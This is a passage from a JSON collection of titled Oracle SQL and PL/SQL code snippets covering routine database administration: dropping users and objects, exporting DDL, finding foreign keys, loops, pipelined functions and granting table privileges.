    "description": "CREATE OR REPLACE PROCEDURE p AS     table_or_view_not_exist EXCEPTION;     PRAGMA EXCEPTION_INIT (table_or_view_not_exist, -942);     attempted_ddl_on_in_use_GTT EXCEPTION;     PRAGMA EXCEPTION_INIT (attempted_ddl_on_in_use_GTT, -14452); BEGIN     EXECUTE IMMEDIATE 'DROP TABLE t';  EXCEPTION     WHEN table_or_view_not_exist THEN         dbms_output.put_line('Table t did not exist at drop time. Continuing.');      WHEN attempted_ddl_on_in_use_GTT THEN         dbms_output.put_line('Help ! Someone is doing my job!');         dbms_output.put_line('Please rescue me');         RAISE; END p;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2756,
    "keyword": null,
    "link": null,
    "title": " oracle drop type if exists",
    "description": "DECLARE     existing_type number; BEGIN     SELECT count(*) into existing_type     FROM ALL_TYPES     WHERE TYPE_NAME = 'type_name' AND OWNER = 'schema_name';     IF existing_type = 1 then         EXECUTE IMMEDIATE 'DROP TYPE schema_name.type_name';     END IF; END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2757,
    "keyword": null,
    "link": null,
    "title": " oracle drop user",
    "description": "-- Specify CASCADE to drop all objects in the user's schema before dropping user. DROP USER MY_USER CASCADE;\nBEGIN     FOR cur_rec IN (SELECT OBJECT_NAME, OBJECT_TYPE                     FROM ALL_OBJECTS\t\t-- Choose types                     WHERE OBJECT_TYPE IN ('TABLE', 'VIEW', 'PACKAGE',                                           'PROCEDURE', 'FUNCTION', 'SEQUENCE'))                           AND OWNER = 'owner_name'         LOOP             BEGIN                 IF cur_rec.OBJECT_TYPE = 'TABLE'                 THEN                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\" CASCADE CONSTRAINTS';                 ELSE                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\"';                 END IF;             EXCEPTION                 WHEN OTHERS                     THEN                         DBMS_OUTPUT.PUT_LINE('FAILED: DROP '                             || cur_rec.OBJECT_TYPE || ' \"'                             || cur_rec.OBJECT_NAME || '\"');             END;         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2758,
    "keyword": null,
    "link": null,
    "title": " oracle duplicate table",
    "description": "-- Copy a table (datas, columns and storage parameters) CREATE TABLE my_new_table AS SELECT * FROM my_source_table; -- Use NOLOGGING, and PARALLEL if allowed for faster copy CREATE TABLE my_new_table     PARALLEL 10 NOLOGGING AS SELECT /*+ parallel(10) */ * FROM my_source_table; -- To create an empty table: CREATE TABLE my_new_table AS SELECT * FROM my_source_table \tWHERE rownum = 0;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2759,
    "keyword": null,
    "link": null,
    "title": " oracle duration between timestamps",
    "description": "-- Duration between 2 timestamps SELECT (extract(DAY FROM TIME2 - TIME1) * 24 * 60 * 60)             + (extract(HOUR FROM TIME2 - TIME1) * 60 * 60)             + (extract(MINUTE FROM TIME2 - TIME1) * 60)             + extract(SECOND FROM TIME2 - TIME1) FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2760,
    "keyword": null,
    "link": null,
    "title": " oracle dynamic cursor for loop example",
    "description": "-- open the cursor and then fetch and count every row DECLARE     CURSOR c IS SELECT * FROM emp;     cursor_count c%ROWTYPE;     totalrows    NUMBER; BEGIN     OPEN c;     LOOP         FETCH c INTO cursor_count;         dbms_output.put_line('names' || cursor_count.ename);         EXIT WHEN c%NOTFOUND;         END LOOP;     totalrows := c%ROWCOUNT;     dbms_output.put_line('total rows' || totalrows); END;\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2761,
    "keyword": null,
    "link": null,
    "title": " oracle enable chain",
    "description": "BEGIN \tDBMS_SCHEDULER.enable(name => '\"schema\".\"chain_name\"'); END;\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2762,
    "keyword": null,
    "link": null,
    "title": " oracle enable disable trigger",
    "description": "ALTER TRIGGER my_trigger ENABLE; ALTER TRIGGER my_trigger DISABLE; -- Associated with a table: ALTER TABLE my_trigger ENABLE ALL TRIGGERS; ALTER TABLE my_trigger DISABLE ALL TRIGGERS;\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2763,
    "keyword": null,
    "link": null,
    "title": " oracle enable job",
    "description": "BEGIN \tDBMS_SCHEDULER.enable(name => '\"schema\".\"job_name\"'); END;\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2764,
    "keyword": null,
    "link": null,
    "title": " oracle explain plan",
    "description": "-- Without execution EXPLAIN PLAN FOR select ...; SELECT * FROM TABLE(dbms_xplan.display); -- With execution SELECT /*+ gather_plan_statistics */  ...; SELECT * FROM TABLE(dbms_xplan.display_cursor(NULL,NULL,'ALLSTATS LAST'));\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2765,
    "keyword": null,
    "link": null,
    "title": " oracle export trigger ddl",
    "description": "SELECT DBMS_METADATA.get_ddl('TRIGGER', TRIGGER_NAME, OWNER) FROM ALL_TRIGGERS\t\t-- or DBA_TRIGGERS, USER_TRIGGERS WHERE OWNER = 'swhema_name'   AND TRIGGER_NAME = 'trigger_name';\n-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2766,
    "keyword": null,
    "link": null,
    "title": " oracle export view ddl",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2767,
    "keyword": null,
    "link": null,
    "title": " oracle extract year from current date",
    "description": "SELECT extract(YEAR FROM sysdate) FROM dual;\t\t\t// number SELECT to_char(sysdate, 'YYYY') FROM dual;\t\t\t\t// varchar\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2768,
    "keyword": null,
    "link": null,
    "title": " oracle find all tables with column name",
    "description": "-- Oracle-specific -- all_tab_columns is a magic table listing all columns from all tables select table_name from all_tab_columns where column_name = 'PICK_COLUMN';\nSELECT * FROM USER_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN'; -- Connected user SELECT * FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN';\t-- Other schemas SELECT * FROM DBA_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN';\t-- All tables\n",
    "reg_date": "2021-10-12T09:58:16.000Z"
  },
  {
    "id": 2769,
    "keyword": null,
    "link": null,
    "title": " oracle find constraints referencing a table",
    "description": "SELECT cons.OWNER \t\t\tAS CHILD_OWNER,        cons.TABLE_NAME \t\tAS CHILD_TABLE,        cons.CONSTRAINT_NAME AS CONSTAINT_NAME,        cons.CONSTRAINT_TYPE AS CONSTRAINT_TYPE,        col.OWNER \t\t\tAS PARENT_OWNER,        col.TABLE_NAME \t\tAS PARENT_TABLE,        col.COLUMN_NAME \t\tAS COLUMN_NAME FROM DBA_CONS_COLUMNS col, DBA_CONSTRAINTS cons WHERE cons.R_OWNER = col.OWNER   AND cons.R_CONSTRAINT_NAME = col.CONSTRAINT_NAME   AND cons.TABLE_NAME = 'table_name';\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2770,
    "keyword": null,
    "link": null,
    "title": " oracle find foreign key dependencies",
    "description": "SELECT c.OWNER, a.TABLE_NAME, a.COLUMN_NAME, a.CONSTRAINT_NAME,         c.R_OWNER AS REF_OWNER, cpk.TABLE_NAME AS REF_TABLE,         cpk.CONSTRAINT_NAME AS REF_PK FROM ALL_CONS_COLUMNS a  JOIN ALL_CONSTRAINTS c ON a.OWNER = c.OWNER     AND a.CONSTRAINT_NAME = c.CONSTRAINT_NAME  JOIN ALL_CONSTRAINTS cpk ON c.R_OWNER = cpk.OWNER     AND c.R_CONSTRAINT_NAME = cpk.CONSTRAINT_NAME WHERE c.CONSTRAINT_TYPE = 'R' AND c.TABLE_NAME= 'table_name';\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2771,
    "keyword": null,
    "link": null,
    "title": " oracle find sql id",
    "description": "SELECT * FROM DBA_HIST_SQLTEXT WHERE upper(SQL_TEXT) LIKE 'INSERT INTO MY_TABLE%';\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2772,
    "keyword": null,
    "link": null,
    "title": " oracle find text in functions",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' \tAND TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2773,
    "keyword": null,
    "link": null,
    "title": " oracle find unusable indexes",
    "description": "SELECT OWNER, INDEX_NAME, NULL AS PARTITION_NAME, NULL AS SUBPARTITION_NAME, TABLESPACE_NAME FROM DBA_INDEXES WHERE STATUS = 'UNUSABLE' UNION ALL\t-- Index partitions: SELECT INDEX_OWNER, INDEX_NAME, PARTITION_NAME, NULL AS SUBPARTITION_NAME, TABLESPACE_NAME FROM DBA_IND_PARTITIONS WHERE STATUS = 'UNUSABLE' UNION ALL\t-- Index subpartitions: SELECT INDEX_OWNER, INDEX_NAME, PARTITION_NAME, SUBPARTITION_NAME, TABLESPACE_NAME FROM DBA_IND_SUBPARTITIONS WHERE STATUS = 'UNUSABLE';\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2774,
    "keyword": null,
    "link": null,
    "title": " oracle finding duplicate records",
    "description": "SELECT column_name, COUNT(column_name) FROM table_name GROUP BY column_name HAVING COUNT(column_name) > 1;\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2775,
    "keyword": null,
    "link": null,
    "title": " oracle first day of last year",
    "description": "-- Oracle: First day of previous year SELECT trunc(add_months(sysdate, -12), 'YEAR') FROM DUAL;\n-- Last day of current month SELECT trim(to_date(last_day(sysdate), 'DD/MM/YYYY')) AS LASTDAY FROM DUAL;\n-- Oracle: First day of year SELECT TRUNC(sysdate, 'YEAR') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2776,
    "keyword": null,
    "link": null,
    "title": " oracle first letter uppercase",
    "description": "SELECT INITCAP('the soap') \"Capitals\" FROM DUAL; \t-- The Soap\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2777,
    "keyword": null,
    "link": null,
    "title": " oracle first row",
    "description": "SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM = 1; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 1 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\n-- NOTE: This is for Oracle/PLSQL only  -- > EXAMPLE select *  from CONSUMERS where ROWNUM <= 1  /* -- > SYNTAX select *  from {yourTable} where ROWNUM <= {number-of-rows}  */\n",
    "reg_date": "2021-10-12T09:58:17.000Z"
  },
  {
    "id": 2778,
    "keyword": null,
    "link": null,
    "title": " oracle for loop",
    "description": "DECLARE     i NUMBER; BEGIN     FOR i IN 1..5         LOOP             dbms_output.PUT_LINE('i value : ' || i);         END LOOP; END;\nDECLARE     count number(2) := 10; BEGIN     FOR count in 10..20                         (FOR count in REVERSE 10..20)     LOOP         dbms_output.put_line(\"COUNT : \" || count);     END LOOP; END;  -- FOR count in 10..20  -- it will print value from 10 to 20 -- FOR count in REVERSE 10..20  -- it will print value from 20 to 10\nFOR contatore IN lower bound..upper bound LOOP  \t... END LOOP;\n-- FOR LOOP --------------   FOR loop_counter IN [REVERSE] lowest_number..highest_number   LOOP      {...statements...}   END LOOP;    -- FOR LOOP (MODERN) --------------   FOR record_index in cursor_name   LOOP   {...statements...}   END LOOP;    -- CURSOR LOOP (OLD STYLE) -------------- \tOPEN c_customers;      LOOP      \tFETCH c_customers into c_rowtype_var;      \tEXIT WHEN c_customers%notfound;      \t{...statements...};      END LOOP;\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2779,
    "keyword": null,
    "link": null,
    "title": " oracle force indexes dblink",
    "description": "SELECT  /*+ DRIVING_SITE(table_name) */ *     FROM table_name@dblink_name t     WHERE t.REGISTER_DATE = trunc(sysdate);\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2780,
    "keyword": null,
    "link": null,
    "title": " oracle foreign key reference table",
    "description": "SELECT cons.OWNER \t\t\tAS CHILD_OWNER,        cons.TABLE_NAME \t\tAS CHILD_TABLE,        cons.CONSTRAINT_NAME AS CONSTAINT_NAME,        cons.CONSTRAINT_TYPE AS CONSTRAINT_TYPE,        col.OWNER \t\t\tAS PARENT_OWNER,        col.TABLE_NAME \t\tAS PARENT_TABLE,        col.COLUMN_NAME \t\tAS COLUMN_NAME FROM DBA_CONS_COLUMNS col, DBA_CONSTRAINTS cons WHERE cons.R_OWNER = col.OWNER   AND cons.R_CONSTRAINT_NAME = col.CONSTRAINT_NAME   AND cons.TABLE_NAME = 'table_name';\nSELECT c.OWNER, a.TABLE_NAME, a.COLUMN_NAME, a.CONSTRAINT_NAME,         c.R_OWNER AS REF_OWNER, cpk.TABLE_NAME AS REF_TABLE,         cpk.CONSTRAINT_NAME AS REF_PK FROM ALL_CONS_COLUMNS a  JOIN ALL_CONSTRAINTS c ON a.OWNER = c.OWNER     AND a.CONSTRAINT_NAME = c.CONSTRAINT_NAME  JOIN ALL_CONSTRAINTS cpk ON c.R_OWNER = cpk.OWNER     AND c.R_CONSTRAINT_NAME = cpk.CONSTRAINT_NAME WHERE c.CONSTRAINT_TYPE = 'R' AND c.TABLE_NAME= 'table_name';\nCREATE TABLE hr.admin_emp (          empno      NUMBER(5) PRIMARY KEY,          ename      VARCHAR2(15) NOT NULL,          ssn        NUMBER(9) ENCRYPT,          job        VARCHAR2(10),          mgr        NUMBER(5),          hiredate   DATE DEFAULT (sysdate),          photo      BLOB,          sal        NUMBER(7,2),          hrly_rate  NUMBER(7,2) GENERATED ALWAYS AS (sal/2080),          comm       NUMBER(7,2),          deptno     NUMBER(3) NOT NULL                      CONSTRAINT admin_dept_fkey REFERENCES hr.departments                      (department_id))\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2781,
    "keyword": null,
    "link": null,
    "title": " oracle function",
    "description": "CREATE OR REPLACE FUNCTION to_date_check_null(dateString IN VARCHAR2,  \tdateFormat IN VARCHAR2) RETURN DATE IS BEGIN      IF dateString IS NULL THEN         return NULL;     ELSE         return to_date(dateString, dateFormat);     END IF; END;\nCREATE [OR REPLACE] FUNCTION function_name    [ (parameter [,parameter]) ]     RETURN return_datatype  IS | AS     [declaration_section]  BEGIN    executable_section  [EXCEPTION    exception_section]  END [function_name];\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2782,
    "keyword": null,
    "link": null,
    "title": " oracle function return",
    "description": "CREATE OR REPLACE FUNCTION to_date_check_null(dateString IN VARCHAR2,  \tdateFormat IN VARCHAR2) RETURN DATE IS BEGIN      IF dateString IS NULL THEN         return NULL;     ELSE         return to_date(dateString, dateFormat);     END IF; END;\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2783,
    "keyword": null,
    "link": null,
    "title": " oracle function return array of number",
    "description": "CREATE TYPE object_row_type as OBJECT (   object_type VARCHAR(18),   object_name VARCHAR(30) );  CREATE TYPE object_table_type as TABLE OF object_row_type;  CREATE OR REPLACE FUNCTION get_all_objects    RETURN object_table_type PIPELINED AS BEGIN     FOR cur IN (SELECT * FROM all_objects)     LOOP       PIPE ROW(object_row_type(cur.object_type, cur.object_name));        END LOOP;      RETURN; END;  SELECT * FROM TABLE(get_all_objects);\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2784,
    "keyword": null,
    "link": null,
    "title": " oracle function return list of values",
    "description": "CREATE TYPE object_row_type as OBJECT (   object_type VARCHAR(18),   object_name VARCHAR(30) );  CREATE TYPE object_table_type as TABLE OF object_row_type;  CREATE OR REPLACE FUNCTION get_all_objects    RETURN object_table_type PIPELINED AS BEGIN     FOR cur IN (SELECT * FROM all_objects)     LOOP       PIPE ROW(object_row_type(cur.object_type, cur.object_name));        END LOOP;      RETURN; END;  SELECT * FROM TABLE(get_all_objects);\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2785,
    "keyword": null,
    "link": null,
    "title": " oracle function return multiple rows",
    "description": "CREATE TYPE object_row_type as OBJECT (   object_type VARCHAR(18),   object_name VARCHAR(30) );  CREATE TYPE object_table_type as TABLE OF object_row_type;  CREATE OR REPLACE FUNCTION get_all_objects    RETURN object_table_type PIPELINED AS BEGIN     FOR cur IN (SELECT * FROM all_objects)     LOOP       PIPE ROW(object_row_type(cur.object_type, cur.object_name));        END LOOP;      RETURN; END;  SELECT * FROM TABLE(get_all_objects);\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2786,
    "keyword": null,
    "link": null,
    "title": " oracle function return resultset",
    "description": "CREATE OR REPLACE FUNCTION to_date_check_null(dateString IN VARCHAR2,  \tdateFormat IN VARCHAR2) RETURN DATE IS BEGIN      IF dateString IS NULL THEN         return NULL;     ELSE         return to_date(dateString, dateFormat);     END IF; END;\nCREATE TYPE object_row_type as OBJECT (   object_type VARCHAR(18),   object_name VARCHAR(30) );  CREATE TYPE object_table_type as TABLE OF object_row_type;  CREATE OR REPLACE FUNCTION get_all_objects    RETURN object_table_type PIPELINED AS BEGIN     FOR cur IN (SELECT * FROM all_objects)     LOOP       PIPE ROW(object_row_type(cur.object_type, cur.object_name));        END LOOP;      RETURN; END;  SELECT * FROM TABLE(get_all_objects);\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2787,
    "keyword": null,
    "link": null,
    "title": " oracle function return table",
    "description": "CREATE TYPE object_row_type as OBJECT (   object_type VARCHAR(18),   object_name VARCHAR(30) );  CREATE TYPE object_table_type as TABLE OF object_row_type;  CREATE OR REPLACE FUNCTION get_all_objects    RETURN object_table_type PIPELINED AS BEGIN     FOR cur IN (SELECT * FROM all_objects)     LOOP       PIPE ROW(object_row_type(cur.object_type, cur.object_name));        END LOOP;      RETURN; END;  SELECT * FROM TABLE(get_all_objects);\ncreate or replace function return_table return t_table as   v_ret   t_table; begin   --  -- Call constructor to create the returned  -- variable:  --     v_ret  := t_table();   --  -- Add one record after another to the returned table.  -- Note: the &raquo;table&laquo; must be extended before adding  -- another record:  --     v_ret.extend; v_ret(v_ret.count) := t_record(1, 'one'  );     v_ret.extend; v_ret(v_ret.count) := t_record(2, 'two'  );     v_ret.extend; v_ret(v_ret.count) := t_record(3, 'three');   --  -- Return the record:  --     return v_ret;  end return_table; / \ncreate or replace type t_record as object (   i number,   n varchar2(30) ); / \n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2788,
    "keyword": null,
    "link": null,
    "title": " oracle generate list of dates in between a date range",
    "description": "-- All dates between 01/01/2021 and 15/01/2021 SELECT to_date('01/01/2021', 'DD/MM/YYYY') + ROWNUM - 1 FROM ALL_OBJECTS WHERE ROWNUM <= to_date('15/01/2021', 'DD/MM/YYYY')  \t- to_date('01/01/2021', 'DD/MM/YYYY') + 1;\n",
    "reg_date": "2021-10-12T09:58:18.000Z"
  },
  {
    "id": 2789,
    "keyword": null,
    "link": null,
    "title": " oracle generated column",
    "description": "CREATE TABLE T1 (     ID          NUMBER,     PRODUCT     VARCHAR2(50),     PRICE       NUMBER(10, 2),     TAXED_PRICE NUMBER(10, 2) GENERATED ALWAYS AS (round(PRICE * 1.2, 2)) VIRTUAL ); INSERT INTO T1 (ID, PRODUCT, PRICE) VALUES (1, 'Spoon', 12);\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2790,
    "keyword": null,
    "link": null,
    "title": " oracle get current schema",
    "description": "SELECT sys_context('userenv', 'current_schema') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2791,
    "keyword": null,
    "link": null,
    "title": " oracle get ddl",
    "description": "-- DDL object_type SELECT OWNER,        OBJECT_TYPE,        decode(object_type,               'DATABASE LINK', 'DB_LINK',               'JOB', 'PROCOBJ',               'RULE SET', 'PROCOBJ',               'RULE', 'PROCOBJ',               'EVALUATION CONTEXT', 'PROCOBJ',               'CREDENTIAL', 'PROCOBJ',               'CHAIN', 'PROCOBJ',               'PROGRAM', 'PROCOBJ',               'PACKAGE', 'PACKAGE_SPEC',               'PACKAGE BODY', 'PACKAGE_BODY',               'TYPE', 'TYPE_SPEC',               'TYPE BODY', 'TYPE_BODY',               'MATERIALIZED VIEW', 'MATERIALIZED_VIEW',               'QUEUE', 'AQ_QUEUE',               'JAVA CLASS', 'JAVA_CLASS',               'JAVA TYPE', 'JAVA_TYPE',               'JAVA SOURCE', 'JAVA_SOURCE',               'JAVA RESOURCE', 'JAVA_RESOURCE',               'XML SCHEMA', 'XMLSCHEMA',               object_type            ) AS object_type_ddl FROM DBA_OBJECTS; -- DDL of object depending on object_type_ddl SELECT dbms_metadata.get_ddl('object_type_ddl', 'obj_name', 'schema_name')  \tFROM DUAL;\n-- 4000 characters max SELECT dbms_metadata.get_ddl('PROCOBJ', 'job_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('PROCOBJ', 'program_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('TABLE', 'table_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('VIEW', 'view_name', 'owner') FROM DUAL;  SELECT dbms_metadata.get_ddl('PACKAGE', 'pkg_name', 'owner') FROM DUAL;  SELECT dbms_metadata.get_ddl('PROCEDURE', 'proc_name', 'owner') FROM DUAL;   SELECT dbms_metadata.get_ddl('INDEX', 'index_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('TYPE', 'type_name', 'owner') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2792,
    "keyword": null,
    "link": null,
    "title": " oracle get foreign keys on table",
    "description": "SELECT c.OWNER, a.TABLE_NAME, a.COLUMN_NAME, a.CONSTRAINT_NAME,         c.R_OWNER AS REF_OWNER, cpk.TABLE_NAME AS REF_TABLE,         cpk.CONSTRAINT_NAME AS REF_PK FROM ALL_CONS_COLUMNS a  JOIN ALL_CONSTRAINTS c ON a.OWNER = c.OWNER     AND a.CONSTRAINT_NAME = c.CONSTRAINT_NAME  JOIN ALL_CONSTRAINTS cpk ON c.R_OWNER = cpk.OWNER     AND c.R_CONSTRAINT_NAME = cpk.CONSTRAINT_NAME WHERE c.CONSTRAINT_TYPE = 'R' AND c.TABLE_NAME= 'table_name';\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2793,
    "keyword": null,
    "link": null,
    "title": " oracle get nls settings",
    "description": "SELECT * FROM (SELECT 'SESSION' SCOPE, nsp.* FROM NLS_SESSION_PARAMETERS nsp       UNION ALL       SELECT 'DATABASE' SCOPE, ndp.* FROM NLS_DATABASE_PARAMETERS ndp       UNION ALL       SELECT 'INSTANCE' SCOPE, nip.* FROM NLS_INSTANCE_PARAMETERS nip) a PIVOT (listagg(VALUE) WITHIN GROUP (ORDER BY SCOPE) FOR SCOPE IN (     'SESSION' AS \"SESSION\" ,'DATABASE' AS DATABASE ,'INSTANCE' AS INSTANCE)); -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2794,
    "keyword": null,
    "link": null,
    "title": " oracle get partition name by high value",
    "description": "-- Sortable (by high_value) list of partitions / subpartitions in a table -- For partitions, change ALL_TAB_SUBPARTITIONS to ALL_TAB_PARTITIONS SELECT TABLE_NAME, PARTITION_NAME, SUBPARTITION_NAME, HIGH_VALUE FROM (     WITH xml_s AS (         SELECT dbms_xmlgen.getxmltype('SELECT TABLE_NAME,PARTITION_NAME,           SUBPARTITION_NAME, HIGH_VALUE            FROM ALL_TAB_SUBPARTITIONS WHERE TABLE_NAME=''MY_TABLE''            AND TABLE_OWNER=''MY_USER''') as x           FROM dual     )     SELECT xmltab.* FROM       xml_s,       xmltable(         '/ROWSET/ROW' passing xml_s.x columns           TABLE_NAME varchar2(30) path 'TABLE_NAME',           PARTITION_NAME  varchar2(30)  path 'PARTITION_NAME',           SUBPARTITION_NAME  varchar2(30)  path 'SUBPARTITION_NAME',           HIGH_VALUE varchar2(200) path 'HIGH_VALUE'       ) xmltab     ORDER BY TABLE_NAME, PARTITION_NAME, SUBPARTITION_NAME, HIGH_VALUE );\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2795,
    "keyword": null,
    "link": null,
    "title": " oracle get running queries",
    "description": "SELECT s.SID,        s.USERNAME,        sql.OPTIMIZER_MODE,        sql.CPU_TIME,        sql.ELAPSED_TIME,        sql.SQL_TEXT,        s.SERIAL# FROM V$SQLAREA sql,      V$SESSION s WHERE s.SQL_HASH_VALUE = sql.HASH_VALUE   AND s.SQL_ADDRESS = sql.ADDRESS   AND s.USERNAME IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2796,
    "keyword": null,
    "link": null,
    "title": " oracle get sql id from query",
    "description": "SELECT * FROM DBA_HIST_SQLTEXT WHERE upper(SQL_TEXT) LIKE 'INSERT INTO MY_TABLE%';\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2797,
    "keyword": null,
    "link": null,
    "title": " oracle get table key",
    "description": "SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'TABLE_NAME' AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner ORDER BY cols.table_name, cols.position;\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2798,
    "keyword": null,
    "link": null,
    "title": " oracle get table schema",
    "description": "SELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All database Tables\n",
    "reg_date": "2021-10-12T09:58:19.000Z"
  },
  {
    "id": 2799,
    "keyword": null,
    "link": null,
    "title": " oracle get trigger ddl",
    "description": "SELECT DBMS_METADATA.get_ddl('TRIGGER', TRIGGER_NAME, OWNER) FROM ALL_TRIGGERS\t\t-- or DBA_TRIGGERS, USER_TRIGGERS WHERE OWNER = 'swhema_name'   AND TRIGGER_NAME = 'trigger_name';\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2800,
    "keyword": null,
    "link": null,
    "title": " oracle get view definition",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'FLEX_TRADE_AGREG', 'OWNER_NAME')  \tFROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2801,
    "keyword": null,
    "link": null,
    "title": " oracle grant on all tables in schema",
    "description": "BEGIN    FOR R IN (SELECT owner, table_name FROM all_tables               WHERE owner='OTHER_SCHEMA') LOOP       EXECUTE IMMEDIATE 'GRANT SELECT, INSERT, UPDATE, DELETE ON ' ||                          R.owner || '.' || R.table_name || ' TO MY_SCHEMA';    END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2802,
    "keyword": null,
